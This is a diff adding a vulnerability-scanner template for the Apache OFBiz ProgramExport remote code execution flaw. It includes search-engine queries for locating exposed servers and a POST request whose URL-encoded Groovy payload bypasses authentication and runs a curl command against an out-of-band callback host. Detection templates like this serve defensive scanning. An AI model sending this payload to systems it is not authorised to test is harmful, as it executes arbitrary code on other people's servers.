@@ -1,0 +1,29 @@
+id: apache-ofbiz-programexport-rce
+
+info:
+  name: Apache ofbiz programexport RCE
+  author: chaitin
+  severity: critical
+  verified: true
+  description: |-
+    The programexport script in Apache ofbiz allows remote attackers to execute arbitrary code via a crafted request.
+    fofa: app="Apache_OFBiz"
+    zoomEye: app:"Apache OFBiz"
+  reference:
+    - https://mp.weixin.qq.com/s/GfGb048u9VedzM2FhBJz8Q
+    - https://stack.chaitin.com/vuldb/detail/2dbae0cb-0292-45ee-a66d-a2567b11b257
+  tags: apache,ofbiz,rce
+  created: 2023/12/29
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+rules:
+  r0:
+    request:
+      method: POST
+      path: /webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y
+      body: |
+        groovyProgram=import+groovy.lang.GroovyShell%0D%0A%0D%0AGroovyShell+shell+%3D+new+GroovyShell%28%29%3B%0D%0Ashell.evaluate%28%27%22curl%20{{oobHTTP}}%22.execute%28%29%27%29
+    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+expression: r0()
